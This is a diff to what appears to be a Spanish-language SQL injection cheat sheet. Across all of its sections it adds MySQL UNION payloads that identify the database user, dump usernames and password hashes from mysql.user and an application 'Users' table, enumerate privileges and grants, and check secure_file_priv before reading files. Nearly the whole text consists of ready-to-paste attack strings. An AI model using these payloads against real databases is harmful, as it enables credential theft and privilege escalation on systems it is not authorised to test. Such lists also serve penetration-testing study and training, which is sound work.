@@ -34,8 +34,12 @@
 ```
 ## Usuario
 ```sql
+SELECT USER()
+SELECT CURRENT_USER()
+SELECT user from mysql.user
 ' UNION SELECT NULL,user(),NULL-- -
 ' UNION SELECT NULL,user(),NULL#
+' UNION SELECT 1, user, 3, 4 from mysql.user-- -
 ```
 ## Enumerar las DB
 ```sql
@@ -64,6 +68,14 @@ UNION SELECT NULL,password,NULL from users#
 UNION SELECT NULL,concat(Username,0x3a,Password),NULL from Colegio.Users-- -
 UNION SELECT NULL,concat(Username,0x3a,Password),NULL from Colegio.Users#
 UNION SELECT 1,concat(User,0x3a,Password),3,4 from mysql.user-- -
+```
+## Privilegios de usuario
+```sql
+' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user-- -
+' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -
+SELECT sql_grants FROM information_schema.sql_show_grants
+' UNION SELECT 1, grantee, privilege_type, is_grantable FROM information_schema.user_privileges-- -
+' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -
 ```
 ## Leyendo Archivos
 ```sql
